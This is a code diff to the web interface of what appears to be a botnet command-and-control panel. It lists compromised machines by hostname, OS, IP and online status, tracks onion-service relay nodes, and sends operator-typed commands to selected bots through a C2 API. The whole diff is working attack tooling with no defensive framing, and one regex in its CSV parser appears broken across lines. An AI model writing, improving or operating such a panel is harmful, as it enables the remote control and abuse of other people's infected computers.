@@ -123,77 +123,217 @@
     </div>
 
     <script>
-        const botsList = document.getElementById('bots').getElementsByTagName('ul')[0];
+        const nodesList = document.getElementById('nodes').getElementsByTagName('ul')[0];
         const commandInput = document.getElementById('command');
         const outputDiv = document.getElementById('output');
+        const botsTableBody = document.querySelector('#bots-table tbody');
+        const selectAllButton = document.getElementById('select-all');
 
         let selectedBots = [];
+        let botsSnapshot = [];
 
-        function updateBotList(bots) {
-            botsList.innerHTML = '';
-            for (const botId in bots) {
-                const bot = bots[botId];
-                const li = document.createElement('li');
-
-                const statusCircle = document.createElement('span');
-                statusCircle.className = `status-circle status-${bot.status}`;
-
-                const botIdSpan = document.createElement('span');
-                botIdSpan.textContent = botId;
-
-                li.appendChild(statusCircle);
-                li.appendChild(botIdSpan);
-
-                li.onclick = () => toggleBotSelection(li, botId);
-                if (selectedBots.includes(botId)) {
-                    li.classList.add('selected');
-                }
-                botsList.appendChild(li);
-            }
+        if (selectAllButton) {
+            selectAllButton.addEventListener('click', toggleSelectAll);
         }
 
-        function toggleBotSelection(li, botId) {
+        function parseCsv(text) {
+            const lines = text.trim().split(/
+?
+/);
+            if (!lines.length) {
+                return [];
+            }
+            const headers = lines[0].split(',').map(h => h.trim());
+            return lines.slice(1).filter(Boolean).map(line => {
+                const cols = line.split(',');
+                const row = {};
+                headers.forEach((header, idx) => {
+                    row[header] = (cols[idx] || '').trim();
+                });
+                return row;
+            });
+        }
+
+        function normalizeBots(payload) {
+            if (Array.isArray(payload)) {
+                return payload;
+            }
+            if (payload && typeof payload === 'object') {
+                return Object.keys(payload).map(id => ({ bot_id: id, ...(payload[id] || {}) }));
+            }
+            return [];
+        }
+
+        function updateBotList(bots) {
+            botsSnapshot = normalizeBots(bots);
+            const visibleIds = botsSnapshot.map(bot => bot.bot_id);
+            selectedBots = selectedBots.filter(id => visibleIds.includes(id));
+
+            botsTableBody.innerHTML = '';
+
+            botsSnapshot.forEach(bot => {
+                // Normalize C2 color statuses to textual labels where necessary
+                let rawStatus = String(bot.status || '').toLowerCase();
+                let statusLabel = (bot.status || '').toUpperCase();
+                if (rawStatus === 'green') statusLabel = 'ONLINE';
+                else if (rawStatus === 'yellow') statusLabel = 'STANDBY';
+                else if (rawStatus === 'red') statusLabel = 'OFFLINE';
+                if (!statusLabel) {
+                    statusLabel = 'OFFLINE';
+                }
+                const indicatorSlug = statusLabel === 'ONLINE' ? 'online' : (statusLabel === 'STANDBY' ? 'standby' : 'offline');
+                const lastTimestamp = parseFloat(bot.last_seen_timestamp || bot.timestamp || '0') || undefined;
+                const firstTimestamp = parseFloat(bot.first_seen_timestamp || '0') || lastTimestamp;
+
+                const row = document.createElement('tr');
+                row.dataset.botId = bot.bot_id;
+                if (selectedBots.includes(bot.bot_id)) {
+                    row.classList.add('selected');
+                }
+
+                const selectCell = document.createElement('td');
+                const selectBtn = document.createElement('button');
+                selectBtn.className = 'row-select-btn';
+                const isSelected = selectedBots.includes(bot.bot_id);
+                selectBtn.textContent = isSelected ? '✓' : '+ ';
+                selectBtn.title = isSelected ? 'Deselect bot' : 'Select bot';
+                selectBtn.addEventListener('click', event => {
+                    event.stopPropagation();
+                    toggleBotSelection(bot.bot_id);
+                });
+                selectCell.appendChild(selectBtn);
+                row.appendChild(selectCell);
+
+                const idCell = document.createElement('td');
+                idCell.textContent = bot.bot_id;
+                row.appendChild(idCell);
+
+                const hostCell = document.createElement('td');
+                hostCell.textContent = bot.hostname || bot.host || '—';
+                row.appendChild(hostCell);
+
+                const osCell = document.createElement('td');
+                osCell.textContent = bot.os || '—';
+                row.appendChild(osCell);
+
+                const ipCell = document.createElement('td');
+                ipCell.textContent = bot.ip || '—';
+                row.appendChild(ipCell);
+
+                const statusCell = document.createElement('td');
+                const statusPill = document.createElement('span');
+                statusPill.className = `status-pill status-${indicatorSlug}`;
+                statusPill.textContent = statusLabel;
+                statusCell.appendChild(statusPill);
+                row.appendChild(statusCell);
+
+                const lastSeenCell = document.createElement('td');
+                const lastPrimary = document.createElement('span');
+                if (lastTimestamp) {
+                    lastPrimary.textContent = new Date(lastTimestamp * 1000).toLocaleString();
+                } else if (bot.last_seen && bot.last_seen !== 'INIT') {
+                    lastPrimary.textContent = bot.last_seen;
+                } else {
+                    lastPrimary.textContent = 'INIT';
+                }
+                lastSeenCell.appendChild(lastPrimary);
+                row.appendChild(lastSeenCell);
+
+                const firstSeenCell = document.createElement('td');
+                const firstPrimary = document.createElement('span');
+                if (firstTimestamp) {
+                    firstPrimary.textContent = new Date(firstTimestamp * 1000).toLocaleString();
+                } else if (bot.first_seen && bot.first_seen !== 'INIT') {
+                    firstPrimary.textContent = bot.first_seen;
+                } else {
+                    firstPrimary.textContent = 'INIT';
+                }
+                firstSeenCell.appendChild(firstPrimary);
+                row.appendChild(firstSeenCell);
+
+                row.addEventListener('click', () => toggleBotSelection(bot.bot_id));
+
+                botsTableBody.appendChild(row);
+            });
+
+            updateSelectAllButton();
+        }
+
+        function updateNodeList(nodes) {
+            nodesList.innerHTML = '';
+            (nodes || []).forEach(node => {
+                const li = document.createElement('li');
+                const url = node.onion_url || node.onion || 'unknown';
+                const status = node.status || 'unknown';
+                li.textContent = `${url} (${status})`;
+                nodesList.appendChild(li);
+            });
+        }
+
+        function toggleBotSelection(botId) {
             const index = selectedBots.indexOf(botId);
             if (index > -1) {
                 selectedBots.splice(index, 1);
-                li.classList.remove('selected');
             } else {
                 selectedBots.push(botId);
-                li.classList.add('selected');
             }
+            updateBotList(botsSnapshot);
+        }
+
+        function toggleSelectAll() {
+            if (!botsSnapshot.length) {
+                return;
+            }
+            if (selectedBots.length === botsSnapshot.length) {
+                selectedBots = [];
+            } else {
+                selectedBots = botsSnapshot.map(bot => bot.bot_id);
+            }
+            updateBotList(botsSnapshot);
+        }
+
+        function updateSelectAllButton() {
+            if (!selectAllButton) {
+                return;
+            }
+            if (!botsSnapshot.length) {
+                selectAllButton.textContent = 'Select All';
+                selectAllButton.disabled = true;
+                return;
+            }
+            selectAllButton.disabled = false;
+            selectAllButton.textContent = selectedBots.length === botsSnapshot.length ? 'Clear All' : 'Select All';
         }
 
         function sendCommand() {
             const command = commandInput.value;
             if (!command) {
-                alert("Please enter a command.");
+                alert('Please enter a command.');
                 return;
             }
-            if (selectedBots.length === 0) {
-                alert("Please select at least one bot.");
+            if (!selectedBots.length) {
+                alert('Please select at least one bot.');
                 return;
             }
 
             const message = {
                 targets: selectedBots,
-                command: command
+                command,
             };
 
             fetch('/api/c2/command', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message),
             })
-            .then(response => response.json())
-            .then(data => {
-                logToOutput(`Command sent to ${selectedBots.join(', ')}. Response: ${JSON.stringify(data)}`);
-            })
-            .catch(error => {
-                console.error('Error sending command:', error);
-                logToOutput('Error sending command.');
-            });
+                .then(response => response.json())
+                .then(data => {
+                    logToOutput(`Command sent to ${selectedBots.join(', ')}. Response: ${JSON.stringify(data)}`);
+                })
+                .catch(error => {
+                    console.error('Error sending command:', error);
+                    logToOutput('Error sending command.');
+                });
 
             commandInput.value = '';
         }
@@ -206,20 +346,44 @@
         }
 
         function fetchBots() {
+            // Prefer live JSON snapshot when available
             fetch('/api/bots')
-                .then(response => response.json())
+                .then(resp => {
+                    if (!resp.ok) throw new Error('api/bots unavailable');
+                    return resp.json();
+                })
                 .then(data => {
                     updateBotList(data);
                 })
-                .catch(error => console.error('Error fetching bots:', error));
+                .catch(() => {
+                    // Fallback to CSV registry for legacy servers
+                    fetch('/registry.csv?_=' + Date.now())
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Failed to fetch registry.csv');
+                            }
+                            return response.text();
+                        })
+                        .then(text => {
+                            const data = parseCsv(text);
+                            updateBotList(data);
+                        })
+                        .catch(error => console.error('Error fetching bots:', error));
+                });
         }
 
-        // Fetch bots every 5 seconds
+        function fetchNodes() {
+            fetch('/api/nodes')
+                .then(response => response.json())
+                .then(data => updateNodeList(data))
+                .catch(error => console.error('Error fetching nodes:', error));
+        }
+
         setInterval(fetchBots, 5000);
+        setInterval(fetchNodes, 10000);
 
-        // Initial fetch
         fetchBots();
-
+        fetchNodes();
     </script>
 
 </body>
